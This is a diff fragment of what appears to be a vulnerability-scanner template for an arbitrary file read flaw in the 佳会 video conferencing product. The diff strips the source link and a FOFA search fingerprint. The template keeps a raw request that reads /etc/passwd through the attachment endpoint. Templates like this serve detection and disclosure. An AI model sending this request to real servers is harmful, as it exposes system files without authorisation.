@@ -3,12 +3,8 @@ info:
   name: 佳会视频会议 attachment 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gp9ndy67bk5qse53'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gp9ndy67bk5qse53
-    fofa: body="/user/get_app_scheme?site_id="
 http:
 - raw:
   - 'GET /attachment?file=/etc/passwd HTTP/1.1
